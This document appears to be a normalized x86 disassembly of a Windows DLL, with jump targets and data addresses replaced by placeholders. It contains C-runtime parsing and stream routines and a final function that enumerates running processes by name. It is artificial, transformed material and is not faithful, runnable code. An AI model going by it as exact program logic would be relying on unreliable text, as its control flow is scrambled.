mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_10005f2d
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_10005e15
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_10011efd
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] 0x49
push eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
call sub_10009230
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
push eax
call sub_1001204e
add esp 0x10
leave
retn
sub_10011f31
push ebx
push esi
mov esi rw-data
push edi
push esi
push 0x1
call sub_100076a9
push esi
call sub_10012aff
mov edi eax
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x20 ]
push esi
call sub_10005f2d
push esi
push edi
mov ebx eax
call sub_10012b8c
push esi
push 0x1
call sub_100076fb
add esp 0x28
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_10011f72
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_1000a0c8
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_1000ad91
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
lea edi [ edi + ecx * 4 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_1001204e
push ebp
mov ebp esp
sub esp 0x1c4
and [ ebp - 0x15 ] 0x0
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov al [ esi ]
mov [ ebp - 0x4 ] ebx
test al al
mov [ ebp - 0x34 ] ebx
je r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x15 ] al
jne r-xdata
mov ecx [ rw-data ]
movzx eax al
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax al
push 0x8
push eax
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ esi ] 0x25
jne r-xdata
dec [ ebp - 0x4 ]
push edi
lea eax [ ebp - 0x4 ]
push edi
push eax
call sub_10012adb
pop ecx
pop ecx
push eax
call sub_10012ac4
movzx eax [ esi + 0x1 ]
inc esi
push eax
call sub_10012cdc
add esp 0xc
cmp eax ebx
je r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_10012aaa
mov ebx eax
pop ecx
movzx eax [ esi ]
inc esi
cmp eax ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp + 0xc ] esi
jne r-xdata
and [ ebp - 0x35 ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x17 ] 0x0
and [ ebp - 0xe ] 0x0
and [ ebp - 0xf ] 0x0
and [ ebp - 0x16 ] 0x0
xor edi edi
and [ ebp - 0x5 ] 0x0
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0xd ] 0x1
mov [ ebp - 0x30 ] ebx
movzx eax [ esi + 0x1 ]
inc esi
push eax
call sub_10012cdc
pop ecx
jmp r-xdata
dec [ ebp - 0x4 ]
push edi
push ebx
mov ecx [ rw-data ]
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_10012aaa
pop ecx
movzx ecx [ esi ]
inc esi
cmp ecx eax
mov [ ebp + 0xc ] esi
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x20 ]
lea eax [ eax + eax * 4 ]
lea eax [ ebx + eax * 2 - 0x30 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
test eax eax
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp [ esi ] 0x25
jne r-xdata
dec [ ebp - 0x4 ]
push edi
push eax
call sub_10012ac4
dec [ ebp - 0x4 ]
push edi
push ebx
call sub_10012ac4
add esp 0x10
dec [ ebp - 0x4 ]
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0xf ] 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
dec [ ebp - 0xd ]
dec [ ebp - 0x5 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
movzx ebx [ esi + 0x1 ]
inc esi
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0xe ] 0x0
mov [ ebp + 0xc ] esi
jne r-xdata
mov esi eax
inc [ ebp - 0xd ]
cmp ebx 0x77
je r-xdata
inc [ ebp - 0xe ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
and [ ebp - 0xf ] 0x0
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
add eax 0x4
mov [ ebp + 0x10 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x2c ] eax
inc [ ebp - 0x5 ]
jmp r-xdata
inc [ ebp - 0xf ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
mov ebx [ ebp + 0xc ]
movzx esi [ ebx ]
or esi 0x20
cmp esi 0x6e
mov [ ebp - 0x3c ] esi
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
cmp [ esi + 0x1 ] 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
xor eax eax
cmp [ ebp - 0x20 ] eax
je r-xdata
cmp esi 0x63
je r-xdata
mov [ ebp - 0x5 ] 0x1
cmp al 0x43
je r-xdata
cmp [ esi + 0x2 ] 0x34
lea eax [ esi + 0x2 ]
jne r-xdata
inc [ ebp - 0xd ]
jmp r-xdata
cmp esi 0x6f
jg r-xdata
cmp [ ebp - 0xc ] eax
je r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_10012aaa
cmp esi 0x7b
je r-xdata
or [ ebp - 0x5 ] 0xff
jmp r-xdata
inc [ ebp - 0x30 ]
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x24 ] 0x0
mov esi eax
jmp r-xdata
mov eax esi
sub eax 0x70
je r-xdata
je r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push [ ebp - 0x14 ]
jmp r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_10012adb
pop ecx
jmp r-xdata
mov [ ebp - 0xd ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x14 ]
cmp ebx 0x2d
jne r-xdata
cmp esi 0x63
je r-xdata
call sub_10012ac4
pop ecx
pop ecx
jmp r-xdata
pop ecx
mov [ ebp - 0x14 ] eax
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x17 ] 0x1
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
cmp esi 0x64
je r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
dec [ ebp - 0xc ]
jne r-xdata
mov edi rw-data
mov [ ebp - 0x16 ] 0x1
sub eax 0x3
je r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
inc [ ebp - 0xc ]
mov [ ebp - 0x20 ] 0x1
jle r-xdata
cmp [ ebp - 0xf ] 0x0
jne r-xdata
cmp [ ebp - 0xf ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_10012aaa
pop ecx
mov ebx eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov dl [ ebp - 0x35 ]
cmp [ edi ] 0x5d
jne r-xdata
mov ebx [ ebp - 0x14 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
mov edi rw-data
jmp r-xdata
mov [ ebp - 0x16 ] 0x1
movzx eax [ ebx ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
cmp esi 0x67
jle r-xdata
cmp [ ebp - 0x17 ] 0x0
je r-xdata
cmp esi 0x78
je r-xdata
cmp [ ebp - 0x17 ] 0x0
je r-xdata
cmp esi 0x78
jne r-xdata
mov [ ebp - 0xf ] 0x1
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
inc edi
cmp al 0x2d
jne r-xdata
mov dl 0x5d
inc edi
mov [ ebp - 0x59 ] 0x20
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x17 ] 0x1
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
or [ ebp - 0x18 ] 0xff
dec [ ebp - 0x15 ]
cmp [ ebp - 0xe ] 0x0
jne r-xdata
mov ebx [ ebp - 0x14 ]
lea esi [ ebp - 0x1c4 ]
cmp ebx 0x2d
jne r-xdata
cmp esi 0x69
je r-xdata
cmp esi 0x46
jne r-xdata
neg edi
cmp [ rw-data ] 0x1
jle r-xdata
cmp esi 0x70
je r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
neg eax
adc ecx 0x0
mov [ ebp - 0x28 ] eax
neg ecx
mov [ ebp - 0x24 ] ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x3c ] 0x7b
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x64 ]
or [ eax ] bl
jmp r-xdata
test dl dl
je r-xdata
mov al [ edi ]
cmp al 0x5d
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0xc ]
jne r-xdata
mov edi [ ebp + 0xc ]
inc edi
mov [ ebp + 0xc ] edi
cmp [ edi ] 0x5e
jne r-xdata
mov [ ebp - 0x16 ] 0x1
inc [ ebp - 0x15 ]
inc [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x44 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1c4 ] bl
lea esi [ ebp - 0x1c3 ]
jmp r-xdata
push 0x64
pop esi
cmp esi 0x6e
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] 0x0
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x80
push 0x80
push ebx
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x80
push 0x80
push ebx
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ ebp - 0x2c ]
dec [ ebp - 0x4 ]
push edi
push [ ebp - 0x14 ]
mov [ ebp - 0x30 ] esi
call sub_10012ac4
pop ecx
pop ecx
mov [ ebp + 0xc ] edi
mov cl [ edi ]
cmp cl 0x5d
je r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_10012aaa
mov ebx eax
pop ecx
cmp bl 0x78
mov [ ebp - 0x14 ] ebx
je r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_10012aaa
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
push 0x20
lea eax [ ebp - 0x64 ]
push 0x0
push eax
call sub_10004940
add esp 0xc
cmp [ ebp - 0x3c ] 0x7b
jne r-xdata
mov eax edi
lea edi [ eax + 0x1 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov edi [ ebp + 0x8 ]
dec [ ebp - 0xc ]
inc [ ebp - 0x4 ]
push edi
call sub_10012aaa
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
cmp [ ebp - 0xe ] 0x0
mov edi [ ebp - 0x4 ]
je r-xdata
cmp [ ebp - 0xe ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push ebx
call sub_10012ac4
pop ecx
pop ecx
push ebx
shl edi 0x4
call sub_10012a73
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
test eax eax
je r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push ebx
call sub_10012ac4
pop ecx
pop ecx
cmp esi 0x6f
jne r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
push 0x4
pop ecx
call sub_10012d10
push ebx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
call sub_10012a73
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
test eax eax
je r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_10012aaa
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0x14 ] eax
je r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
inc edi
cmp dl cl
jae r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_10012aaa
pop ecx
mov ebx eax
mov [ ebp - 0x14 ] ebx
push 0x78
jmp r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0xf ] 0x1
jmp r-xdata
mov [ ebp - 0xc ] 0x15d
cmp [ ebp - 0xc ] 0x15d
jle r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x34 ]
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_10012aaa
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
dec [ ebp - 0xc ]
je r-xdata
cmp esi 0x6f
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0xa
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
call sub_100095f0
cmp ebx 0x38
jge r-xdata
inc [ ebp - 0x1c ]
lea eax [ ebx - 0x30 ]
cdq
add [ ebp - 0x28 ] eax
adc [ ebp - 0x24 ] edx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
dec [ ebp - 0x4 ]
push edi
push eax
call sub_10012ac4
pop ecx
pop ecx
mov ecx eax
push 0x1
and ecx 0x7
pop edx
movsx ebx [ ebp - 0x18 ]
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x64 ]
xor ecx ebx
test ecx edx
je r-xdata
cmp [ ebp - 0x30 ] esi
je r-xdata
mov al dl
mov dl cl
mov al cl
jmp r-xdata
pop esi
jmp r-xdata
cmp esi 0x78
mov [ ebp - 0x1c ] 0x1
je r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x2c ]
je r-xdata
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
lea edi [ edi + edi * 4 ]
shl edi 0x1
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_10012aaa
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
dec [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
push 0x3
pop ecx
call sub_10012d10
jmp r-xdata
cmp [ ebp - 0xe ] 0x0
jne r-xdata
cmp [ ebp - 0xe ] 0x0
jne r-xdata
xor dl dl
jmp r-xdata
movzx edx dl
movzx esi al
sub esi edx
inc esi
cmp dl al
ja r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push ebx
call sub_10012ac4
pop ecx
pop ecx
push 0x30
pop ebx
jmp r-xdata
push 0x6f
cmp [ rw-data ] bl
jne r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ eax ] di
mov [ eax ] edi
jmp r-xdata
inc [ ebp - 0x1c ]
cmp [ ebp - 0x20 ] 0x0
lea edi [ edi + ebx - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
inc [ ebp - 0x34 ]
cmp [ ebp - 0x3c ] 0x63
je r-xdata
inc [ ebp - 0x30 ]
jmp r-xdata
cmp [ ebp - 0x16 ] 0x0
je r-xdata
mov ecx edx
mov eax edx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x64 ]
or [ eax ] bl
inc edx
dec esi
jne r-xdata
mov [ ebp - 0x14 ] ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
inc [ ebp - 0x1c ]
mov [ esi ] bl
inc esi
inc [ ebp - 0x4 ]
push edi
call sub_10012aaa
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
cmp [ ebp - 0x16 ] 0x0
mov eax [ ebp - 0x2c ]
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov [ esi ] al
inc esi
mov ecx [ rw-data ]
mov [ ebp - 0x38 ] al
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
dec [ ebp - 0x4 ]
push edi
push ebx
call sub_10012ac4
cmp [ ebp - 0x1c ] 0x0
pop ecx
pop ecx
je r-xdata
cmp ebx 0x65
je r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_10012aaa
mov ebx eax
mov al [ rw-data ]
mov [ esi ] al
pop ecx
mov [ ebp - 0x14 ] ebx
inc esi
and [ eax ] 0x0
jmp r-xdata
and [ eax ] 0x0
jmp r-xdata
push [ rw-data ]
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x3e ]
push eax
call sub_10012bb6
mov ax [ ebp - 0x3e ]
add esp 0xc
mov [ esi ] ax
inc esi
inc esi
jmp r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_10012aaa
pop ecx
mov [ ebp - 0x37 ] al
cmp [ ebp - 0xe ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
cmp ebx 0x45
jne r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
mov [ ebp - 0x2c ] esi
jmp r-xdata
inc [ ebp - 0x34 ]
and [ esi ] 0x0
lea eax [ ebp - 0x1c4 ]
push eax
movsx eax [ ebp - 0xd ]
push [ ebp - 0x2c ]
dec eax
push eax
call [ rw-data ]
add esp 0xc
jmp r-xdata
mov [ esi ] 0x65
inc esi
inc [ ebp - 0x4 ]
push edi
call sub_10012aaa
mov ebx eax
pop ecx
cmp ebx 0x2d
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ esi ] al
inc esi
jmp r-xdata
inc [ ebp - 0x1c ]
mov [ esi ] bl
inc esi
inc [ ebp - 0x4 ]
push edi
call sub_10012aaa
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_10012aaa
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
and [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ ebp - 0x1c ]
mov [ esi ] bl
inc esi
jmp r-xdata
sub_10012a73
cmp [ rw-data ] 0x1
push esi
jle r-xdata
mov esi [ esp + 0x8 ]
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
mov esi [ esp + 0x8 ]
push 0x4
push esi
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
mov eax esi
pop esi
retn
and esi 0xffffffdf
sub esi 0x7
test eax eax
jne r-xdata
sub_10012adb
push esi
mov esi [ esp + 0x8 ]
push edi
push [ esp + 0x10 ]
inc [ esi ]
call sub_10012aaa
mov edi eax
push edi
call sub_10012cdc
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax edi
pop edi
pop esi
retn
sub_10012aff
push esi
mov esi [ esp + 0x8 ]
push [ esi + 0x10 ]
call sub_1000a10c
test eax eax
pop ecx
je r-xdata
xor eax eax
pop esi
retn
cmp esi rw-data
jne r-xdata
cmp esi rw-data
jne r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ eax * 4 + rw-data ] 0x0
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] ebx
push ebx
call sub_100049d2
test eax eax
pop ecx
mov [ edi ] eax
jne r-xdata
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
push 0x1
pop eax
pop edi
pop ebx
pop esi
retn
sub_10012b8c
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
pop esi
retn
mov esi [ esp + 0xc ]
test [ esi + 0xd ] 0x10
je r-xdata
push esi
call sub_10007886
and [ esi + 0xd ] 0xee
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_10012bb6
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10012c13
add esp 0xc
mov [ ebp + 0x10 ] eax
test ebx ebx
je r-xdata
push esi
call edi
push 0x13
call sub_10006a09
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_10006a6a
pop ecx
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10012c13
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov al [ esi ]
cmp al bl
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov [ eax ] bx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jle r-xdata
push 0x1
pop eax
jmp r-xdata
movzx ax al
mov [ ecx ] ax
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp + 0x10 ] eax
jl r-xdata
pop esi
pop ebx
pop ebp
retn
call sub_10004f88
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ esi + 0x1 ] bl
jne r-xdata
xor ecx ecx
cmp [ ebp + 0x8 ] ebx
setne cl
push ecx
push [ ebp + 0x8 ]
push eax
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
sub_10012cdc
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
retn
push 0x8
push [ esp + 0x8 ]
call sub_10009570
pop ecx
pop ecx
retn
sub_10012d10
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_10012d2f
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx 0xffffffff
push esi
je r-xdata
or eax 0xffffffff
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al 0x80
je r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_1000a0c8
pop ecx
test al 0x2
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
dec [ esi ]
mov eax [ esi ]
mov [ eax ] bl
dec [ esi ]
mov eax [ esi ]
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and al 0xef
or al 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_10012da0
sub esp 0x128
push ebx
push edi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
lea eax [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x128
push eax
push ebx
xor edi edi
call Process32First
test eax eax
jne r-xdata
pop edi
or eax eax
pop ebx
add esp 0x128
retn
push ebp
mov ebp [ esp + 0x138 ]
lea ecx [ esp + 0x30 ]
push esi
push ecx
push ebp
call sub_10009d30
mov esi [ esp + 0x148 ]
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop ebx
add esp 0x128
retn
lea eax [ esp + 0x10 ]
push eax
push ebx
call Process32Next
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
mov edi 0x1
mov [ esi ] edx
push ebx
call [ CloseHandle@IAT ]
pop esi
mov eax edi
pop ebp
pop edi
pop ebx
add esp 0x128
retn
lea esi [ esi + edi * 4 ]
lea eax [ esp + 0x10 ]
push eax
push ebx
call Process32Next
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
inc edi
mov [ esi ] edx
add esi 0x4
lea ecx [ esp + 0x34 ]
push ecx
push ebp
call sub_10009d30
add esp 0x8
